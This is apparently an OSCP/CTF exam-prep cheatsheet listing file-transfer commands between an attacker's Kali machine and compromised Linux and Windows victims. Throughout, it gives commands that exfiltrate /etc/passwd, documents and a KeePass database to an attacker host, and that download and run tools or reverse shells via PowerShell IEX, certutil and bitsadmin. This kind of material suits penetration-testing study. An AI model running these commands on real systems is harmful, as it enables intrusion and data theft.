---
title: File Transfer Techniques
published: 2026-06-07
updated: 2026-06-07
description: Cheatsheet and methodology for file transfer during CTFs and Exams.
image: file-transfer.png
tags:
  - file_transfer
  - OSCP
  - cheatsheet
  - windows
  - linux
  - ad
  - active_directory
  - tools
  - utility
  - Utilize
category: OSCP
draft: false
---
- My Tool: [xfer](https://github.com/adityakamalsharma/xfer)
- Note: [ALL IN ONE NOTE](https://github.com/InfoSecWarrior/Offensive-File-Transfer.git)
- TOOL: [ALL IN ONE TOOL](https://github.com/Bit-ByteBandit/OSCP-Transfer.git)
- Blog: [CLICK ME!!](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)
### 1. Attacker (Kali) Setup

**Hosting Services**

| **Service**           | **Command**                                                                                                                        | **Notes**                         |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| **Python 3 HTTP**     | `sudo python3 -m http.server 80` OR `8080`                                                                                         | Standard web server.              |
| **Python 2 HTTP**     | `sudo python -m SimpleHTTPServer 80` OR `8080`                                                                                     | Standard web server.              |
| **PHP Web Server**    | `sudo php -S 0.0.0.0:80`                                                                                                           | Quick PHP rendering.              |
| **Apache2**           | `service apache2 start`                                                                                                            | Heavyweight web server.           |
| **Ruby HTTP**         | `ruby -run -e httpd . -p 9000`                                                                                                     | Standard web server.              |
| **Ruby WEBrick**      | `ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8080, :DocumentRoot => Dir.pwd).start"`                                       | Alternative Ruby server.          |
| **WWWtree**           | `python3 /opt/wwwtree/wwwtree.py -r ~/transfer/ -i tun0 -p 80`                                                                     | Directory listing server.         |
| **Impacket SMB**      | `sudo impacket-smbserver share $(pwd) -smb2support`                                                                                | Hosts current directory over SMB. |
| **Pure-FTPD**         | `systemctl start pure-ftpd`                                                                                                        | Standard FTP service.             |
| **VSFTPD**            | `sudo service vsftpd start`                                                                                                        | Standard FTP service.             |
| **Python Pyftpdlib**  | `sudo python -m pyftpdlib 21`                                                                                                      | Read-only FTP.                    |
| **Python FTP Server** | `sudo python3 -m python_ftp_server -d "</home/kali/project/upload-directory" -u "user" -p "password" --ip <IP-ATTACKER> --port 21` | Authenticated FTP.                |
| **TFTP**              | `sudo atftpd --daemon --port 69 /tftp`                                                                                             | UDP file transfer.                |
| **SSH**               | `sudo systemctl start ssh`                                                                                                         | Enables SCP/SFTP.                 |

**Receiving Services (Upload Catchers)**

| **Service**                   | **Command**                                                                                                                                                   | **Notes**                      |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------ |
| **Python Pyftpdlib (Write)**  | `python3 -m pyftpdlib --write --port 21`                                                                                                                      | Allows anonymous upload.       |
| **Python Upload**             | `python SimpleHTTPServerWithUpload.py`                                                                                                                        | Custom Python upload script.   |
| **Raven Tool**                | `raven 0.0.0.0 9003 --upload-dir /home/kali/OSCP/challenges/relia/mail`                                                                                       | Upload catcher.                |
| **PHP Upload Script**         | `<?php $uploaddir = '/var/www/uploads/'; $uploadfile = $uploaddir . $_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>` | Place in web root.             |
| **Netcat Listener**           | `nc -nlvp 1234` OR `nc -nlvp 4444 > /home/kali/project/outgoing.txt` OR `nc -nlvp 4444 > incoming.sh`                                                         | Catches incoming stream.       |
| **Socat Listener**            | `socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt`                                                                                        | Robust socket catcher.         |
| _(Added)_ **Python 3 Upload** | `python3 -m uploadserver 80`                                                                                                                                  | Native Python 3 upload server. |
| _(Added)_ **Updog**           | `updog -p 80`                                                                                                                                                 | Web UI for HTTP uploads.       |

---

### 2. Transfer to Victim (Attacker ➔ Victim)

**Linux Victims**

|**Tool**|**Command**|
|---|---|
|**Wget**|`wget http://<IP-ATTACKER>/<FILE>`|
|**cURL**|`curl http://<IP-ATTACKER>/<FILE> -o <file>`|
|**Axel**|`axel -a -n 20 -o filename.pdf http://www.domain.tld/directory/large-file.pdf`|
|**Netcat (Send from Kali)**|`nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`|
|**Socat (Send from Kali)**|`sudo socat TCP4-LISTEN:443,fork file:<FILE-NAME>`|
|**SCP (Pull)**|`scp USER@HOST_IP:/tmp/remote_file.txt local_file.txt` _(Syntax adjusted for pull context)_|
|**SCP (Push from Kali)**|`scp local_file.txt USER@HOST_IP:/tmp/remote_file.txt`|
|**FTP (Manual)**|`ftp <IP-ATTACKER>` , then `get <FILE-NAME>` OR `mget <FILE-*>`. Always use `binary` type.|
|_(Added)_ **Bash /dev/tcp**|`cat < /dev/tcp/<IP-ATTACKER>/80 > file`|

**Windows Victims**

|**Tool**|**Command**|
|---|---|
|**PowerShell WebClient**|`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP-ATTACKER>/wget.exe','C:\Users\Public\Desktop\wget.exe')"`|
|**PowerShell IEX**|`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`|
|**PowerShell Execution**|`PowerShell.exe -ExecutionPolicy Bypass` (Use to run downloaded scripts).|
|**cURL**|`curl http://<IP-ATTACKER>/<FILE> -o <file>`|
|**Certutil**|`certutil -urlcache -split -f http://IP-attacker/filename.exe path/to/shell.exe`|
|**Python Script**|`python.exe -c "import urllib2; print urllib2.urlopen('http://<IP-ATTACKER>/fgdump.exe').read()" > fgdump.exe`|
|**PHP Script**|`<?php file_put_contents("/tmp/php-reverse-shell.txt", fopen("http://<IP-ATTACKER>/php-reverse-shell.txt", "r")); ?>`|
|**SMB Copy**|`copy \\0.0.0.0\share\filename.exe C:\users\public\music\filename.exe`|
|**Netcat**|`nc -nlvp 4444 > incoming.exe` (Requires Kali to send).|
|**Socat**|`socat TCP4:10.11.0.4:443 file:<FILE-NAME>,create`|
|**FTP (Interactive)**|`open <IP-ATTACKER>` , `<USERNAME>` , `<PASSWORD>` , `binary` , `mget file.exe` , `disconnect` , `quit`.|
|**FTP (Scripted)**|`ftp -i -s:ftp.txt`|
|_(Added)_ **Bitsadmin**|`bitsadmin /transfer n http://<IP-ATTACKER>/file.exe C:\Temp\file.exe`|

---

### 3. Transfer to Attacker (Victim ➔ Attacker)

**Linux Victims**

| **Tool**        | **Command**                                            |
| --------------- | ------------------------------------------------------ |
| **Wget (POST)** | `wget --post-file=/etc/passwd <IP-ATTACKER:1234>`      |
| **Cancel**      | `cancel -u "$(cat /etc/passwd)" -h <IP-ATTACKER:1234>` |
| **Whois**       | `whois -h <IP-ATTACKER> - p<1234> $(cat /etc/passwd)`  |

**Windows Victims**

|**Tool**|**Command**|
|---|---|
|**PowerShell WebClient**|`powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')`|
|**PowerShell RestMethod**|`Invoke-RestMethod -Uri http://192.168.45.208:9003/ -Method Post -InFile C:\users\jim\Desktop\Database.kdbx`|
|**TFTP**|`tftp -i <IP-ATTACKER> put <FILENAME>`|
|**SMB Copy**|`copy C:\users\public\music\filename.txt \\0.0.0.0\share\filename.txt`|
|**FTP (Interactive)**|`open <IP-ATTACKER>` , `<USERNAME>` , `<PASSWORD>` , `binary` , `put file.exe` , `disconnect` , `quit`.|

---

### 4. Session & GUI Transfers

|**Tool**|**Command / Action**|
|---|---|
|**xfreerdp**|`xfreerdp /v:$ip /u:<username> /p:<password> /dynamic-resolution +clipboard /drive:share,/home/kali/project`|
|**rdesktop**|`rdesktop $ip -u <username> -p <password> -r disk:tmp=$(pwd)`|
|**Evil-WinRM**|Execute `evil-winrm` , then use `upload filename.exe` OR `download filename.txt /home/kali/projects/filename.txt`|
|**GUI Clipboard**|Just copy via the GUI|
|_(Added)_ **Base64**|Attack machine: `base64 file -w 0`. Victim: `echo "<BASE64>" \| base64 -d > file`|

---

### File Transfer via SSH (Victim to Kali)

**Prerequisite:** If pushing from the victim to Kali, ensure the SSH service is running on your Kali machine (`sudo systemctl start ssh`). If pulling from the victim, the victim must have an SSH server running.

#### 1. SCP (Secure Copy Protocol)

The most straightforward method for direct file transfer.

|**Execution Location**|**Action**|**Command**|
|---|---|---|
|**Execute on Kali**|Pull from Victim|`scp <victim_user>@<VICTIM_IP>:/path/to/victim_file /path/to/local_destination/`|
|**Execute on Victim**|Push to Kali|`scp /path/to/victim_file <kali_user>@<KALI_IP>:/path/to/kali_destination/`|
|**Execute on Kali**|Pull Directory (Recursive)|`scp -r <victim_user>@<VICTIM_IP>:/path/to/victim_dir /path/to/local_destination/`|

#### 2. SFTP (SSH File Transfer Protocol)

Useful if you need an interactive session to browse directories before transferring.

|**Execution Location**|**Action**|**Command**|
|---|---|---|
|**Execute on Kali**|Connect to Victim|`sftp <victim_user>@<VICTIM_IP>`|
|**SFTP Prompt**|Download to Kali|`get /path/to/victim_file`|
|**Execute on Victim**|Connect to Kali|`sftp <kali_user>@<KALI_IP>`|
|**SFTP Prompt**|Upload to Kali|`put /path/to/victim_file`|

#### 3. SSH + Standard Output (Data Streaming)

Highly effective for bypassing restricted environments, transferring files without `scp`/`sftp` binaries, or piping directly into memory/archives without touching the disk on the receiving end.

|**Execution Location**|**Action**|**Command**|
|---|---|---|
|**Execute on Kali**|Pull single file via `cat`|`ssh <victim_user>@<VICTIM_IP> "cat /path/to/victim_file" > /local/path/file`|
|**Execute on Victim**|Push single file via `cat`|`cat /path/to/victim_file \| ssh <kali_user>@<KALI_IP> "cat > /kali/path/file"`|
|**Execute on Kali**|Pull & extract directory|`ssh <victim_user>@<VICTIM_IP> "tar czf - /victim/dir" \| tar xzf - -C /local/dir`|
|**Execute on Victim**|Push & extract directory|`tar czf - /victim/dir \| ssh <kali_user>@<KALI_IP> "tar xzf - -C /kali/dir"`|

> [!NOTE]
> 
> If transferring binary files (like compiled exploits or memory dumps) using the `cat` method, ensure you use `base64` to prevent data corruption during transit:
> 
> **Push:** `cat binary_file | base64 | ssh <kali_user>@<KALI_IP> "base64 -d > binary_file"`